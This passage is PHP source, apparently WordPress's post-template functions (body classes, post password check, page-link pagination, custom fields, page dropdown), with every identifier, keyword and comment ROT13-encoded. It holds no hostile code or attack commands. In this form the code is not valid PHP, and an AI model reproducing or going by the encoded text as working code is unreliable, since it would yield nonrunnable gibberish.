				// Cbfg Sbezng.
				vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'cbfg-sbezngf' ) ) {
					$cbfg_sbezng = trg_cbfg_sbezng( $cbfg->VQ );

					vs ( $cbfg_sbezng && ! vf_jc_reebe( $cbfg_sbezng ) ) {
						$pynffrf[] = 'fvatyr-sbezng-' . fnavgvmr_ugzy_pynff( $cbfg_sbezng );
					} ryfr {
						$pynffrf[] = 'fvatyr-sbezng-fgnaqneq';
					}
				}
			}
		}

		vs ( vf_nggnpuzrag() ) {
			$zvzr_glcr   = trg_cbfg_zvzr_glcr( $cbfg_vq );
			$zvzr_cersvk = neenl( 'nccyvpngvba/', 'vzntr/', 'grkg/', 'nhqvb/', 'ivqrb/', 'zhfvp/' );
			$pynffrf[]   = 'nggnpuzragvq-' . $cbfg_vq;
			$pynffrf[]   = 'nggnpuzrag-' . fge_ercynpr( $zvzr_cersvk, '', $zvzr_glcr );
		} ryfrvs ( vf_cntr() ) {
			$pynffrf[] = 'cntr';
			$pynffrf[] = 'cntr-vq-' . $cbfg_vq;

			vs ( trg_cntrf(
				neenl(
					'cnerag' => $cbfg_vq,
					'ahzore' => 1,
				)
			) ) {
				$pynffrf[] = 'cntr-cnerag';
			}

			vs ( $cbfg->cbfg_cnerag ) {
				$pynffrf[] = 'cntr-puvyq';
				$pynffrf[] = 'cnerag-cntrvq-' . $cbfg->cbfg_cnerag;
			}
		}
	} ryfrvs ( vf_nepuvir() ) {
		vs ( vf_cbfg_glcr_nepuvir() ) {
			$pynffrf[] = 'cbfg-glcr-nepuvir';
			$cbfg_glcr = trg_dhrel_ine( 'cbfg_glcr' );
			vs ( vf_neenl( $cbfg_glcr ) ) {
				$cbfg_glcr = erfrg( $cbfg_glcr );
			}
			$pynffrf[] = 'cbfg-glcr-nepuvir-' . fnavgvmr_ugzy_pynff( $cbfg_glcr );
		} ryfrvs ( vf_nhgube() ) {
			$nhgube    = $jc_dhrel->trg_dhrevrq_bowrpg();
			$pynffrf[] = 'nhgube';
			vs ( vffrg( $nhgube->hfre_avpranzr ) ) {
				$pynffrf[] = 'nhgube-' . fnavgvmr_ugzy_pynff( $nhgube->hfre_avpranzr, $nhgube->VQ );
				$pynffrf[] = 'nhgube-' . $nhgube->VQ;
			}
		} ryfrvs ( vf_pngrtbel() ) {
			$png       = $jc_dhrel->trg_dhrevrq_bowrpg();
			$pynffrf[] = 'pngrtbel';
			vs ( vffrg( $png->grez_vq ) ) {
				$png_pynff = fnavgvmr_ugzy_pynff( $png->fyht, $png->grez_vq );
				vs ( vf_ahzrevp( $png_pynff ) || ! gevz( $png_pynff, '-' ) ) {
					$png_pynff = $png->grez_vq;
				}

				$pynffrf[] = 'pngrtbel-' . $png_pynff;
				$pynffrf[] = 'pngrtbel-' . $png->grez_vq;
			}
		} ryfrvs ( vf_gnt() ) {
			$gnt       = $jc_dhrel->trg_dhrevrq_bowrpg();
			$pynffrf[] = 'gnt';
			vs ( vffrg( $gnt->grez_vq ) ) {
				$gnt_pynff = fnavgvmr_ugzy_pynff( $gnt->fyht, $gnt->grez_vq );
				vs ( vf_ahzrevp( $gnt_pynff ) || ! gevz( $gnt_pynff, '-' ) ) {
					$gnt_pynff = $gnt->grez_vq;
				}

				$pynffrf[] = 'gnt-' . $gnt_pynff;
				$pynffrf[] = 'gnt-' . $gnt->grez_vq;
			}
		} ryfrvs ( vf_gnk() ) {
			$grez = $jc_dhrel->trg_dhrevrq_bowrpg();
			vs ( vffrg( $grez->grez_vq ) ) {
				$grez_pynff = fnavgvmr_ugzy_pynff( $grez->fyht, $grez->grez_vq );
				vs ( vf_ahzrevp( $grez_pynff ) || ! gevz( $grez_pynff, '-' ) ) {
					$grez_pynff = $grez->grez_vq;
				}

				$pynffrf[] = 'gnk-' . fnavgvmr_ugzy_pynff( $grez->gnkbabzl );
				$pynffrf[] = 'grez-' . $grez_pynff;
				$pynffrf[] = 'grez-' . $grez->grez_vq;
			}
		}
	}

	vs ( vf_hfre_ybttrq_va() ) {
		$pynffrf[] = 'ybttrq-va';
	}

	vs ( vf_nqzva_one_fubjvat() ) {
		$pynffrf[] = 'nqzva-one';
		$pynffrf[] = 'ab-phfgbzvmr-fhccbeg';
	}

	vs ( pheerag_gurzr_fhccbegf( 'phfgbz-onpxtebhaq' )
		&& ( trg_onpxtebhaq_pbybe() !== trg_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', 'qrsnhyg-pbybe' ) || trg_onpxtebhaq_vzntr() ) ) {
		$pynffrf[] = 'phfgbz-onpxtebhaq';
	}

	vs ( unf_phfgbz_ybtb() ) {
		$pynffrf[] = 'jc-phfgbz-ybtb';
	}

	vs ( pheerag_gurzr_fhccbegf( 'erfcbafvir-rzorqf' ) ) {
		$pynffrf[] = 'jc-rzorq-erfcbafvir';
	}

	$cntr = $jc_dhrel->trg( 'cntr' );

	vs ( ! $cntr || $cntr < 2 ) {
		$cntr = $jc_dhrel->trg( 'cntrq' );
	}

	vs ( $cntr && $cntr > 1 && ! vf_404() ) {
		$pynffrf[] = 'cntrq-' . $cntr;

		vs ( vf_fvatyr() ) {
			$pynffrf[] = 'fvatyr-cntrq-' . $cntr;
		} ryfrvs ( vf_cntr() ) {
			$pynffrf[] = 'cntr-cntrq-' . $cntr;
		} ryfrvs ( vf_pngrtbel() ) {
			$pynffrf[] = 'pngrtbel-cntrq-' . $cntr;
		} ryfrvs ( vf_gnt() ) {
			$pynffrf[] = 'gnt-cntrq-' . $cntr;
		} ryfrvs ( vf_qngr() ) {
			$pynffrf[] = 'qngr-cntrq-' . $cntr;
		} ryfrvs ( vf_nhgube() ) {
			$pynffrf[] = 'nhgube-cntrq-' . $cntr;
		} ryfrvs ( vf_frnepu() ) {
			$pynffrf[] = 'frnepu-cntrq-' . $cntr;
		} ryfrvs ( vf_cbfg_glcr_nepuvir() ) {
			$pynffrf[] = 'cbfg-glcr-cntrq-' . $cntr;
		}
	}

	$pynffrf[] = 'jc-gurzr-' . fnavgvmr_ugzy_pynff( trg_grzcyngr() );
	vs ( vf_puvyq_gurzr() ) {
		$pynffrf[] = 'jc-puvyq-gurzr-' . fnavgvmr_ugzy_pynff( trg_fglyrfurrg() );
	}

	vs ( ! rzcgl( $pff_pynff ) ) {
		vs ( ! vf_neenl( $pff_pynff ) ) {
			$pff_pynff = cert_fcyvg( '#\f+#', $pff_pynff );
		}
		$pynffrf = neenl_zretr( $pynffrf, $pff_pynff );
	} ryfr {
		// Rafher gung jr nyjnlf pbrepr pynff gb orvat na neenl.
		$pff_pynff = neenl();
	}

	$pynffrf = neenl_znc( 'rfp_ngge', $pynffrf );

	/**
	 * Svygref gur yvfg bs PFF obql pynff anzrf sbe gur pheerag cbfg be cntr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat[] $pynffrf   Na neenl bs obql pynff anzrf.
	 * @cnenz fgevat[] $pff_pynff Na neenl bs nqqvgvbany pynff anzrf nqqrq gb gur obql.
	 */
	$pynffrf = nccyl_svygref( 'obql_pynff', $pynffrf, $pff_pynff );

	erghea neenl_havdhr( $pynffrf );
}

/**
 * Qrgrezvarf jurgure gur cbfg erdhverf cnffjbeq naq jurgure n pbeerpg cnffjbeq unf orra cebivqrq.
 *
 * @fvapr 2.7.0
 *
 * @cnenz vag|JC_Cbfg|ahyy $cbfg Na bcgvbany cbfg. Tybony $cbfg hfrq vs abg cebivqrq.
 * @erghea obby snyfr vs n cnffjbeq vf abg erdhverq be gur pbeerpg cnffjbeq pbbxvr vf cerfrag, gehr bgurejvfr.
 */
shapgvba cbfg_cnffjbeq_erdhverq( $cbfg = ahyy ) {
	$cbfg = trg_cbfg( $cbfg );

	vs ( rzcgl( $cbfg->cbfg_cnffjbeq ) ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
		erghea nccyl_svygref( 'cbfg_cnffjbeq_erdhverq', snyfr, $cbfg );
	}

	vs ( ! vffrg( $_PBBXVR[ 'jc-cbfgcnff_' . PBBXVRUNFU ] ) ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
		erghea nccyl_svygref( 'cbfg_cnffjbeq_erdhverq', gehr, $cbfg );
	}

	erdhver_bapr NOFCNGU . JCVAP . '/pynff-cucnff.cuc';
	$unfure = arj CnffjbeqUnfu( 8, gehr );

	$unfu = jc_hafynfu( $_PBBXVR[ 'jc-cbfgcnff_' . PBBXVRUNFU ] );
	vs ( ! fge_fgnegf_jvgu( $unfu, '$C$O' ) ) {
		$erdhverq = gehr;
	} ryfr {
		$erdhverq = ! $unfure->PurpxCnffjbeq( $cbfg->cbfg_cnffjbeq, $unfu );
	}

	/**
	 * Svygref jurgure n cbfg erdhverf gur hfre gb fhccyl n cnffjbeq.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz obby    $erdhverq Jurgure gur hfre arrqf gb fhccyl n cnffjbeq. Gehr vs cnffjbeq unf abg orra
	 *                          cebivqrq be vf vapbeerpg, snyfr vs cnffjbeq unf orra fhccyvrq be vf abg erdhverq.
	 * @cnenz JC_Cbfg $cbfg     Cbfg bowrpg.
	 */
	erghea nccyl_svygref( 'cbfg_cnffjbeq_erdhverq', $erdhverq, $cbfg );
}

//
// Cntr Grzcyngr Shapgvbaf sbe hfntr va Gurzrf.
//

/**
 * Gur sbeznggrq bhgchg bs n yvfg bs cntrf.
 *
 * Qvfcynlf cntr yvaxf sbe cntvangrq cbfgf (v.r. vapyhqvat gur `<!--arkgcntr-->`
 * Dhvpxgnt bar be zber gvzrf). Guvf gnt zhfg or jvguva Gur Ybbc.
 *
 * @fvapr 1.2.0
 * @fvapr 5.1.0 Nqqrq gur `nevn_pheerag` nethzrag.
 *
 * @tybony vag $cntr
 * @tybony vag $ahzcntrf
 * @tybony vag $zhygvcntr
 * @tybony vag $zber
 *
 * @cnenz fgevat|neenl $netf {
 *     Bcgvbany. Neenl be fgevat bs qrsnhyg nethzragf.
 *
 *     @glcr fgevat       $orsber           UGZY be grkg gb cercraq gb rnpu yvax. Qrsnhyg vf `<c> Cntrf:`.
 *     @glcr fgevat       $nsgre            UGZY be grkg gb nccraq gb rnpu yvax. Qrsnhyg vf `</c>`.
 *     @glcr fgevat       $yvax_orsber      UGZY be grkg gb cercraq gb rnpu yvax, vafvqr gur `<n>` gnt.
 *                                          Nyfb cercraqrq gb gur pheerag vgrz, juvpu vf abg yvaxrq. Qrsnhyg rzcgl.
 *     @glcr fgevat       $yvax_nsgre       UGZY be grkg gb nccraq gb rnpu Cntrf yvax vafvqr gur `<n>` gnt.
 *                                          Nyfb nccraqrq gb gur pheerag vgrz, juvpu vf abg yvaxrq. Qrsnhyg rzcgl.
 *     @glcr fgevat       $nevn_pheerag     Gur inyhr sbe gur nevn-pheerag nggevohgr. Cbffvoyr inyhrf ner 'cntr',
 *                                          'fgrc', 'ybpngvba', 'qngr', 'gvzr', 'gehr', 'snyfr'. Qrsnhyg vf 'cntr'.
 *     @glcr fgevat       $arkg_be_ahzore   Vaqvpngrf jurgure cntr ahzoref fubhyq or hfrq. Inyvq inyhrf ner ahzore
 *                                          naq arkg. Qrsnhyg vf 'ahzore'.
 *     @glcr fgevat       $frcnengbe        Grkg orgjrra cntvangvba yvaxf. Qrsnhyg vf ' '.
 *     @glcr fgevat       $arkgcntryvax     Yvax grkg sbe gur arkg cntr yvax, vs ninvynoyr. Qrsnhyg vf 'Arkg Cntr'.
 *     @glcr fgevat       $cerivbhfcntryvax Yvax grkg sbe gur cerivbhf cntr yvax, vs ninvynoyr. Qrsnhyg vf 'Cerivbhf Cntr'.
 *     @glcr fgevat       $cntryvax         Sbezng fgevat sbe cntr ahzoref. Gur % va gur cnenzrgre fgevat jvyy or
 *                                          ercynprq jvgu gur cntr ahzore, fb 'Cntr %' trarengrf \"Cntr 1\", \"Cntr 2\", rgp.
 *                                          Qrsnhygf gb '%', whfg gur cntr ahzore.
 *     @glcr vag|obby     $rpub             Jurgure gb rpub be abg. Npprcgf 1|gehr be 0|snyfr. Qrsnhyg 1|gehr.
 * }
 * @erghea fgevat Sbeznggrq bhgchg va UGZY.
 */
shapgvba jc_yvax_cntrf( $netf = '' ) {
	tybony $cntr, $ahzcntrf, $zhygvcntr, $zber;

	$qrsnhygf = neenl(
		'orsber'           => '<c pynff=\"cbfg-ani-yvaxf\">' . __( 'Cntrf:' ),
		'nsgre'            => '</c>',
		'yvax_orsber'      => '',
		'yvax_nsgre'       => '',
		'nevn_pheerag'     => 'cntr',
		'arkg_be_ahzore'   => 'ahzore',
		'frcnengbe'        => ' ',
		'arkgcntryvax'     => __( 'Arkg cntr' ),
		'cerivbhfcntryvax' => __( 'Cerivbhf cntr' ),
		'cntryvax'         => '%',
		'rpub'             => 1,
	);

	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

	/**
	 * Svygref gur nethzragf hfrq va ergevrivat cntr yvaxf sbe cntvangrq cbfgf.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz neenl $cnefrq_netf Na neenl bs cntr yvax nethzragf. Frr jc_yvax_cntrf()
	 *                           sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	$cnefrq_netf = nccyl_svygref( 'jc_yvax_cntrf_netf', $cnefrq_netf );

	$bhgchg = '';
	vs ( $zhygvcntr ) {
		vs ( 'ahzore' === $cnefrq_netf['arkg_be_ahzore'] ) {
			$bhgchg .= $cnefrq_netf['orsber'];
			sbe ( $v = 1; $v <= $ahzcntrf; $v++ ) {
				$yvax = $cnefrq_netf['yvax_orsber'] . fge_ercynpr( '%', $v, $cnefrq_netf['cntryvax'] ) . $cnefrq_netf['yvax_nsgre'];

				vs ( $v !== $cntr || ! $zber && 1 === $cntr ) {
					$yvax = _jc_yvax_cntr( $v ) . $yvax . '</n>';
				} ryfrvs ( $v === $cntr ) {
					$yvax = '<fcna pynff=\"cbfg-cntr-ahzoref pheerag\" nevn-pheerag=\"' . rfp_ngge( $cnefrq_netf['nevn_pheerag'] ) . '\">' . $yvax . '</fcna>';
				}

				/**
				 * Svygref gur UGZY bhgchg bs vaqvivqhny cntr ahzore yvaxf.
				 *
				 * @fvapr 3.6.0
				 *
				 * @cnenz fgevat $yvax Gur cntr ahzore UGZY bhgchg.
				 * @cnenz vag    $v    Cntr ahzore sbe cntvangrq cbfgf' cntr yvaxf.
				 */
				$yvax = nccyl_svygref( 'jc_yvax_cntrf_yvax', $yvax, $v );

				// Hfr gur phfgbz yvaxf frcnengbe ortvaavat jvgu gur frpbaq yvax.
				$bhgchg .= ( 1 === $v ) ? ' ' : $cnefrq_netf['frcnengbe'];
				$bhgchg .= $yvax;
			}
			$bhgchg .= $cnefrq_netf['nsgre'];
		} ryfrvs ( $zber ) {
			$bhgchg .= $cnefrq_netf['orsber'];
			$ceri    = $cntr - 1;
			vs ( $ceri > 0 ) {
				$yvax = _jc_yvax_cntr( $ceri ) . $cnefrq_netf['yvax_orsber'] . $cnefrq_netf['cerivbhfcntryvax'] . $cnefrq_netf['yvax_nsgre'] . '</n>';

				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
				$bhgchg .= nccyl_svygref( 'jc_yvax_cntrf_yvax', $yvax, $ceri );
			}
			$arkg = $cntr + 1;
			vs ( $arkg <= $ahzcntrf ) {
				vs ( $ceri ) {
					$bhgchg .= $cnefrq_netf['frcnengbe'];
				}
				$yvax = _jc_yvax_cntr( $arkg ) . $cnefrq_netf['yvax_orsber'] . $cnefrq_netf['arkgcntryvax'] . $cnefrq_netf['yvax_nsgre'] . '</n>';

				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
				$bhgchg .= nccyl_svygref( 'jc_yvax_cntrf_yvax', $yvax, $arkg );
			}
			$bhgchg .= $cnefrq_netf['nsgre'];
		}
	}

	/**
	 * Svygref gur UGZY bhgchg bs cntr yvaxf sbe cntvangrq cbfgf.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz fgevat       $bhgchg UGZY bhgchg bs cntvangrq cbfgf' cntr yvaxf.
	 * @cnenz neenl|fgevat $netf   Na neenl be dhrel fgevat bs nethzragf. Frr jc_yvax_cntrf()
	 *                             sbe vasbezngvba ba npprcgrq nethzragf.
	 */
	$ugzy = nccyl_svygref( 'jc_yvax_cntrf', $bhgchg, $netf );

	vs ( $cnefrq_netf['rpub'] ) {
		rpub $ugzy;
	}
	erghea $ugzy;
}

/**
 * Urycre shapgvba sbe jc_yvax_cntrf().
 *
 * @fvapr 3.1.0
 * @npprff cevingr
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 *
 * @cnenz vag $v Cntr ahzore.
 * @erghea fgevat Yvax.
 */
shapgvba _jc_yvax_cntr( $v ) {
	tybony $jc_erjevgr;
	$cbfg       = trg_cbfg();
	$dhrel_netf = neenl();

	vs ( 1 === $v ) {
		$hey = trg_creznyvax();
	} ryfr {
		vs ( ! trg_bcgvba( 'creznyvax_fgehpgher' ) || va_neenl( $cbfg->cbfg_fgnghf, neenl( 'qensg', 'craqvat' ), gehr ) ) {
			$hey = nqq_dhrel_net( 'cntr', $v, trg_creznyvax() );
		} ryfrvs ( 'cntr' === trg_bcgvba( 'fubj_ba_sebag' ) && (vag) trg_bcgvba( 'cntr_ba_sebag' ) === $cbfg->VQ ) {
			$hey = genvyvatfynfuvg( trg_creznyvax() ) . hfre_genvyvatfynfuvg( \"$jc_erjevgr->cntvangvba_onfr/\" . $v, 'fvatyr_cntrq' );
		} ryfr {
			$hey = genvyvatfynfuvg( trg_creznyvax() ) . hfre_genvyvatfynfuvg( $v, 'fvatyr_cntrq' );
		}
	}

	vs ( vf_cerivrj() ) {

		vs ( ( 'qensg' !== $cbfg->cbfg_fgnghf ) && vffrg( $_TRG['cerivrj_vq'], $_TRG['cerivrj_abapr'] ) ) {
			$dhrel_netf['cerivrj_vq']    = jc_hafynfu( $_TRG['cerivrj_vq'] );
			$dhrel_netf['cerivrj_abapr'] = jc_hafynfu( $_TRG['cerivrj_abapr'] );
		}

		$hey = trg_cerivrj_cbfg_yvax( $cbfg, $dhrel_netf, $hey );
	}

	erghea '<n uers=\"' . rfp_hey( $hey ) . '\" pynff=\"cbfg-cntr-ahzoref\">';
}

//
// Cbfg-zrgn: Phfgbz cre-cbfg svryqf.
//

/**
 * Ergevrirf cbfg phfgbz zrgn qngn svryq.
 *
 * @fvapr 1.5.0
 *
 * @cnenz fgevat $xrl Zrgn qngn xrl anzr.
 * @erghea neenl|fgevat|snyfr Neenl bs inyhrf, be fvatyr inyhr vs bayl bar ryrzrag rkvfgf.
 *                            Snyfr vs gur xrl qbrf abg rkvfg.
 */
shapgvba cbfg_phfgbz( $xrl = '' ) {
	$phfgbz = trg_cbfg_phfgbz();

	vs ( ! vffrg( $phfgbz[ $xrl ] ) ) {
		erghea snyfr;
	} ryfrvs ( 1 === pbhag( $phfgbz[ $xrl ] ) ) {
		erghea $phfgbz[ $xrl ][0];
	} ryfr {
		erghea $phfgbz[ $xrl ];
	}
}

/**
 * Qvfcynlf n yvfg bs cbfg phfgbz svryqf.
 *
 * @fvapr 1.2.0
 *
 * @qrcerpngrq 6.0.2 Hfr trg_cbfg_zrgn() gb ergevrir cbfg zrgn naq eraqre znahnyyl.
 */
shapgvba gur_zrgn() {
	_qrcerpngrq_shapgvba( __SHAPGVBA__, '6.0.2', 'trg_cbfg_zrgn()' );
	$xrlf = trg_cbfg_phfgbz_xrlf();
	vs ( $xrlf ) {
		$yv_ugzy = '';
		sbernpu ( (neenl) $xrlf nf $xrl ) {
			$xrlg = gevz( $xrl );
			vs ( vf_cebgrpgrq_zrgn( $xrlg, 'cbfg' ) ) {
				pbagvahr;
			}

			$inyhrf = neenl_znc( 'gevz', trg_cbfg_phfgbz_inyhrf( $xrl ) );
			$inyhr  = vzcybqr( ', ', $inyhrf );

			$ugzy = fcevags(
				\"<yv><fcna pynff='cbfg-zrgn-xrl'>%f</fcna> %f</yv>\a\",
				/* genafyngbef: %f: Cbfg phfgbz svryq anzr. */
				rfp_ugzy( fcevags( _k( '%f:', 'Cbfg phfgbz svryq anzr' ), $xrl ) ),
				rfp_ugzy( $inyhr )
			);

			/**
			 * Svygref gur UGZY bhgchg bs gur yv ryrzrag va gur cbfg phfgbz svryqf yvfg.
			 *
			 * @fvapr 2.2.0
			 *
			 * @cnenz fgevat $ugzy  Gur UGZY bhgchg sbe gur yv ryrzrag.
			 * @cnenz fgevat $xrl   Zrgn xrl.
			 * @cnenz fgevat $inyhr Zrgn inyhr.
			 */
			$yv_ugzy .= nccyl_svygref( 'gur_zrgn_xrl', $ugzy, $xrl, $inyhr );
		}

		vs ( $yv_ugzy ) {
			rpub \"<hy pynff='cbfg-zrgn'>\a{$yv_ugzy}</hy>\a\";
		}
	}
}

//
// Cntrf.
//

/**
 * Ergevrirf be qvfcynlf n yvfg bs cntrf nf n qebcqbja (fryrpg yvfg).
 *
 * @fvapr 2.1.0
 * @fvapr 4.2.0 Gur `$inyhr_svryq` nethzrag jnf nqqrq.
 * @fvapr 4.3.0 Gur `$pynff` nethzrag jnf nqqrq.
 *
 * @frr trg_cntrf()
 *
 * @cnenz neenl|fgevat $netf {
 *     Bcgvbany. Neenl be fgevat bs nethzragf gb trarengr n cntr qebcqbja. Frr trg_cntrf() sbe nqqvgvbany nethzragf.
 *
 *     @glcr vag          $qrcgu                 Znkvzhz qrcgu. Qrsnhyg 0.
 *     @glcr vag          $puvyq_bs              Cntr VQ gb ergevrir puvyq cntrf bs. Qrsnhyg 0.
 *     @glcr vag|fgevat   $fryrpgrq              Inyhr bs gur bcgvba gung fubhyq or fryrpgrq. Qrsnhyg 0.
 *     @glcr obby|vag     $rpub                  Jurgure gb rpub be erghea gur trarengrq znexhc. Npprcgf 0, 1,
 *                                               be gurve obby rdhvinyragf. Qrsnhyg 1.
 *     @glcr fgevat       $anzr                  Inyhr sbe gur 'anzr' nggevohgr bs gur fryrpg ryrzrag.
 *                                               Qrsnhyg 'cntr_vq'.
 *     @glcr fgevat       $vq                    Inyhr sbe gur 'vq' nggevohgr bs gur fryrpg ryrzrag.
 *     @glcr fgevat       $pynff                 Inyhr sbe gur 'pynff' nggevohgr bs gur fryrpg ryrzrag. Qrsnhyg: abar.
 *                                               Qrsnhygf gb gur inyhr bs `$anzr`.
 *     @glcr fgevat       $fubj_bcgvba_abar      Grkg gb qvfcynl sbe fubjvat ab cntrf. Qrsnhyg rzcgl (qbrf abg qvfcynl).
 *     @glcr fgevat       $fubj_bcgvba_ab_punatr Grkg gb qvfcynl sbe \"ab punatr\" bcgvba. Qrsnhyg rzcgl (qbrf abg qvfcynl).
 *     @glcr fgevat       $bcgvba_abar_inyhr     Inyhr gb hfr jura ab cntr vf fryrpgrq. Qrsnhyg rzcgl.
 *     @glcr fgevat       $inyhr_svryq           Cbfg svryq hfrq gb cbchyngr gur 'inyhr' nggevohgr bs gur bcgvba
 *                                               ryrzragf. Npprcgf nal inyvq cbfg svryq. Qrsnhyg 'VQ'.
 * }
 * @erghea fgevat UGZY qebcqbja yvfg bs cntrf.
 */
shapgvba jc_qebcqbja_cntrf( $netf = '' ) {
	$qrsnhygf = neenl(
		'qrcgu'                 => 0,
		'puvyq_bs'              => 0,
		'fryrpgrq'              => 0,
		'rpub'                  => 1,
		'anzr'                  => 'cntr_vq',
		'vq'                    => '',
		'pynff'                 => '',
		'fubj_bcgvba_abar'      => '',
		'fubj_bcgvba_ab_punatr' => '',
		'bcgvba_abar_inyhr'     => '',
		'inyhr_svryq'           => 'VQ',
	);

	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );

	$cntrf  = trg_cntrf( $cnefrq_netf );
	$bhgchg = '';
	// Onpx-pbzcng jvgu byq flfgrz jurer obgu vq naq anzr jrer onfrq ba $anzr nethzrag.
	vs ( rzcgl( $cnefrq_netf['vq'] ) ) {
		$cnefrq_netf['vq'] = $cnefrq_netf['anzr'];
	}

	vs ( ! rzcgl( $cntrf ) ) {
		$pynff = '';
		vs ( ! rzcgl( $cnefrq_netf['pynff'] ) ) {
			$pynff = \" pynff='\" . rfp_ngge( $cnefrq_netf['pynff'] ) . \"'\";
		}

		$bhgchg = \"<fryrpg anzr='\" . rfp_ngge( $cnefrq_netf['anzr'] ) . \"'\" . $pynff . \" vq='\" . rfp_ngge( $cnefrq_netf['vq'] ) . \"'>\a\";
		vs ( $cnefrq_netf['fubj_bcgvba_ab_punatr'] ) {
			$bhgchg .= \"\g<bcgvba inyhr=\\"-1\\">\" . $cnefrq_netf['fubj_bcgvba_ab_punatr'] . \"</bcgvba>\a\";
		}
		vs ( $cnefrq_netf['fubj_bcgvba_abar'] ) {
			$bhgchg .= \"\g<bcgvba inyhr=\\"\" . rfp_ngge( $cnefrq_netf['bcgvba_abar_inyhr'] ) . '\">' . $cnefrq_netf['fubj_bcgvba_abar'] . \"</bcgvba>\a\";
		}
		$bhgchg .= jnyx_cntr_qebcqbja_gerr( $cntrf, $cnefrq_netf['qrcgu'], $cnefrq_netf );
		$bhgchg .= \"</fryrpg>\a\";
	}

	/**
	 * Svygref gur UGZY bhgchg bs n yvfg bs cntrf nf n qebcqbja.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 4.4.0 `$cnefrq_netf` naq `$cntrf` nqqrq nf nethzragf.
	 *
	 * @cnenz fgevat    $bhgchg      UGZY bhgchg sbe qebcqbja yvfg bs cntrf.
	 * @cnenz neenl     $cnefrq_netf Gur cnefrq nethzragf neenl. Frr jc_qebcqbja_cntrf()
	 *                               sbe vasbezngvba ba npprcgrq nethzragf.
	 * @cnenz JC_Cbfg[] $cntrf       Neenl bs gur cntr bowrpgf.
	 */
	$ugzy = nccyl_svygref( 'jc_qebcqbja_cntrf', $bhgchg, $cnefrq_netf, $cntrf );

	vs ( $cnefrq_netf['rpub'] ) {
		rpub $ugzy;
	}

	erghea $ugzy;
}

/**
 * Ergevrirf be qvfcynlf n yvfg bs cntrf (be uvrenepuvpny cbfg glcr vgrzf) va yvfg (yv) sbezng.
 *
 * @fvapr 1.5.0
 * @fvapr 4.7.0 Nqqrq gur `vgrz_fcnpvat` nethzrag.
 *
 * @frr trg_cntrf()
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz neenl|fgevat $netf {
 *     Bcgvbany. Neenl be fgevat bs nethzragf gb trarengr n yvfg bs cntrf. Frr trg_cntrf() sbe nqqvgvbany nethzragf.
 *
 *     @glcr vag          $puvyq_bs     Qvfcynl bayl gur fho-cntrf bs n fvatyr cntr ol VQ. Qrsnhyg 0 (nyy cntrf).
 *     @glcr fgevat       $nhgubef      Pbzzn-frcnengrq yvfg bs nhgube VQf. Qrsnhyg rzcgl (nyy nhgubef).
 *     @glcr fgevat       $qngr_sbezng  CUC qngr sbezng gb hfr sbe gur yvfgrq cntrf. Eryvrf ba gur 'fubj_qngr' cnenzrgre.
 *                                      Qrsnhyg vf gur inyhr bs 'qngr_sbezng' bcgvba.
 *     @glcr vag          $qrcgu        Ahzore bs yriryf va gur uvrenepul bs cntrf gb vapyhqr va gur trarengrq yvfg.
 *                                      Npprcgf -1 (nal qrcgu), 0 (nyy cntrf), 1 (gbc-yriry cntrf bayl), naq a (cntrf gb
 *                                      gur tvira a qrcgu). Qrsnhyg 0.
 *     @glcr obby         $rpub         Jurgure be abg gb rpub gur yvfg bs cntrf. Qrsnhyg gehr.
 *     @glcr fgevat       $rkpyhqr      Pbzzn-frcnengrq yvfg bs cntr VQf gb rkpyhqr. Qrsnhyg rzcgl.
 *     @glcr neenl        $vapyhqr      Pbzzn-frcnengrq yvfg bs cntr VQf gb vapyhqr. Qrsnhyg rzcgl.
 *     @glcr fgevat       $yvax_nsgre   Grkg be UGZY gb sbyybj gur cntr yvax ynory. Qrsnhyg ahyy.
 *     @glcr fgevat       $yvax_orsber  Grkg be UGZY gb cerprqr gur cntr yvax ynory. Qrsnhyg ahyy.
 *     @glcr fgevat       $cbfg_glcr    Cbfg glcr gb dhrel sbe. Qrsnhyg 'cntr'.
 *     @glcr fgevat|neenl $cbfg_fgnghf  Pbzzn-frcnengrq yvfg be neenl bs cbfg fgnghfrf gb vapyhqr. Qrsnhyg 'choyvfu'.
 *     @glcr fgevat       $fubj_qngr    Jurgure gb qvfcynl gur cntr choyvfu be zbqvsvrq qngr sbe rnpu cntr. Npprcgf
 *                                      'zbqvsvrq' be nal bgure inyhr. Na rzcgl inyhr uvqrf gur qngr. Qrsnhyg rzcgl.
 *     @glcr fgevat       $fbeg_pbyhza  Pbzzn-frcnengrq yvfg bs pbyhza anzrf gb fbeg gur cntrf ol. Npprcgf 'cbfg_nhgube',
 *                                      'cbfg_qngr', 'cbfg_gvgyr', 'cbfg_anzr', 'cbfg_zbqvsvrq', 'cbfg_zbqvsvrq_tzg',
 *                                      'zrah_beqre', 'cbfg_cnerag', 'VQ', 'enaq', be 'pbzzrag_pbhag'. Qrsnhyg 'cbfg_gvgyr'.
 *     @glcr fgevat       $gvgyr_yv     Yvfg urnqvat. Cnffvat n ahyy be rzcgl inyhr jvyy erfhyg va ab urnqvat, naq gur yvfg
 *                                      jvyy abg or jenccrq jvgu habeqrerq yvfg `<hy>` gntf. Qrsnhyg 'Cntrf'.
 *     @glcr fgevat       $vgrz_fcnpvat Jurgure gb cerfreir juvgrfcnpr jvguva gur zrah'f UGZY. Npprcgf 'cerfreir' be 'qvfpneq'.
 *                                      Qrsnhyg 'cerfreir'.
 *     @glcr Jnyxre       $jnyxre       Jnyxre vafgnapr gb hfr sbe yvfgvat cntrf. Qrsnhyg rzcgl juvpu erfhygf va n
